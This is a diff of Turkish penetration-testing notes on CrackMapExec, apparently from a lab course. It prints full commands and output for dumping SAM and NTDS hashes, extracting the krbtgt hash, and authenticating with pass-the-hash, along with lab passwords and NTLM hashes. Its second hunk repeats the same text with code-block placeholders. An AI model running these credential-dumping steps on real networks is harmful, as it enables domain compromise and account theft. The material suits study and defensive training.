@@ -2132,9 +2132,6 @@ cat hosts
 ```
 
 
-
-
-
 ### SQL Privilege Escalation **Module**
 
 CrackMapExec, MSSQL için birkaç modül içerir, bunlardan biri **`mssql_priv`**'dir. Bu modül, MSSQL ayrıcalıklarını sıralar ve kullanarak bir standart kullanıcıdan sysadmin yetkilerine yükselmeye çalışır. Bunu başarmak için, bu modül MSSQL'deki iki (2) ayrıcalık yükseltme vektörünü sıralar: **`EXECUTE AS LOGIN`** ve **`db_owner rolü`**. Modülün üç seçeneği vardır: **`enum_privs`** (ayrıcalıkları listelemek için, varsayılan), **`privesc`** (ayrıcalıkları yükseltmek için) ve **`rollback`** (kullanıcıyı orijinal durumuna geri döndürmek için). Şimdi bunu nasıl çalıştığını görelim. Aşağıdaki örnekte, kullanıcı **`INLANEFREIGHT\robert`**, sysadmin yetkilerine sahip olan **`julio`**'yu taklit etme ayrıcalığına sahiptir.
@@ -4627,80 +4624,301 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+```
+crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --sam
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Dumping SAM hashes
+SMB 10.129.204.133 445 MS01
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
+660cf3453:::
+SMB 10.129.204.133 445 MS01
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
+0:::
+SMB 10.129.204.133 445 MS01
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
+d7e0c089c0:::
+SMB 10.129.204.133 445 MS01
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
+ee1958e7f78070:::
+SMB 10.129.204.133 445 MS01
+localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
+ed3f3ac:::
+SMB 10.129.204.133 445 MS01
+sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
+6:::
+SMB 10.129.204.133 445 MS01 [+] Added 6 SAM hashes
+to the database
+
+```
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p
+'Inlanefreight01!' --ntds
 
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 172.16.1.10 445 DC01 [-] RemoteOperations
+failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
+this could take a while so go grab a redbull...
+SMB 172.16.1.10 445 DC01
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf36
+1aa35efaf:::
+SMB 172.16.1.10 445 DC01
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
+0:::
+SMB 172.16.1.10 445 DC01
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f23
+8e:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88
+057e06a81b54e73b949b:::
+SMB 172.16.1.10 445 DC01
+david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391de
+e0:::
+SMB 172.16.1.10 445 DC01
+john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a
+2:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7
+247e8d4387e76996ff3f18a34316fdd:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c0
+8b424ec2d99589a9cce60:::
+SMB 172.16.1.10 445 DC01 
+inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc82
+1b547d09cf28b5864e54b:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821
+b547d09cf28b5864e54b:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93
+ac3bf058a5ea0e8fdb71:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831b
+ddc88f6d7517615f3d45:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96
+ddbd82224270b57f11fc:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87d
+f16aafa336fb6ffbbac59:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f
+851b949767163c35ae296:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca9
+66c5c0b22eba3c8c4c5ae568b1:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2
+d0f48967ab753fba96b34:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c9290
+84f0efd75791db7cb963d:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\harris:7104:aad3b435b51404eeaad3b435b51404ee:fb9e4fb946a
+15a0c68087bc830b5da12:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\soti:7105:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1
+c2baec10a32db22c72d:::
+SMB 172.16.1.10 445 DC01
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d
+45:::
+SMB 172.16.1.10 445 DC01
+MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99
+c0:::
+SMB 172.16.1.10 445 DC01
+LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322
+dc502:::
+SMB 172.16.1.10 445 DC01 [+] Dumped 23 NTDS
+hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
+08_190342.ntds of which 20 were added to the database
+SMB 172.16.1.10 445 DC01 [*] To extract only
+enabled accounts from the output file, run the following command:
+SMB 172.16.1.10 445 DC01 [*] cat
+/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190342.ntds | grep -
+iv disabled | cut -d ':' -f1
+```
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u julio -p Password1 --ntds
+--user krbtgt
 
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\julio:Password1 (Pwn3d!)
+SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
+this could take a while so go grab a redbull...
+SMB 172.16.1.10 445 DC01
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f23
+8e:::
+SMB 172.16.1.10 445 DC01 [+] Dumped 1 NTDS
+hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
+08_190444.ntds of which 1 were added to the database
+SMB 172.16.1.10 445 DC01 [*] To extract only
+enabled accounts from the output file, run the following command:
+SMB 172.16.1.10 445 DC01 [*] cat
+/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190444.ntds | grep -
+iv disabled | cut -d ':' -f1
+```
 
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+```
+proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p
+'Inlanefreight01!' --ntds --enabled
+
+SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 172.16.1.10 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 172.16.1.10 445 DC01 [-] RemoteOperations
+failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+SMB 172.16.1.10 445 DC01 [+] Dumping the NTDS,
+this could take a while so go grab a redbull...
+SMB 172.16.1.10 445 DC01
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf36
+1aa35efaf:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88
+057e06a81b54e73b949b:::
+SMB 172.16.1.10 445 DC01
+david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391de
+e0:::
+SMB 172.16.1.10 445 DC01
+john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a
+2:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7
+247e8d4387e76996ff3f18a34316fdd:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c0
+8b424ec2d99589a9cce60:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc82
+1b547d09cf28b5864e54b:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821
+b547d09cf28b5864e54b:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93
+ac3bf058a5ea0e8fdb71:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831b
+ddc88f6d7517615f3d45:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96
+ddbd82224270b57f11fc:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87d
+f16aafa336fb6ffbbac59:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f
+851b949767163c35ae296:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca9
+66c5c0b22eba3c8c4c5ae568b1:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2
+d0f48967ab753fba96b34:::
+SMB 172.16.1.10 445 DC01
+inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c9290
+84f0efd75791db7cb963d:::
+SMB 172.16.1.10 445 DC01
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d
+45:::
+SMB 172.16.1.10 445 DC01
+MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99
+c0:::
+SMB 172.16.1.10 445 DC01
+LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322
+dc502:::
+SMB 172.16.1.10 445 DC01 [+] Dumped 21 NTDS
+hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
+05_162819.ntds of which 18 were added to the database
+SMB 172.16.1.10 445 DC01 [*] To extract only
+enabled accounts from the output file, run the following command:
+SMB 172.16.1.10 445 DC01 [*] cat
+/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-05_162819.ntds | grep -
+iv disabled | cut -d ':' -f1
+
+```
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+```
+crackmapexec winrm 10.129.204.133 -u administrator -H
+30b3783ce2abf1af70f77d0660cf3453 --local-auth -x whoami
+
+SMB 10.129.204.133 5985 MS01 [*] Windows 10.0 Build
+17763 (name:MS01) (domain:MS01)
+HTTP 10.129.204.133 5985 MS01 [*]
+http://10.129.204.133:5985/wsman
+WINRM 10.129.204.133 5985 MS01 [+]
+MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
+WINRM 10.129.204.133 5985 MS01 [+] Executed command
+WINRM 10.129.204.133 5985 MS01 ms01\administrator
+
+```
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -6437,80 +6655,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
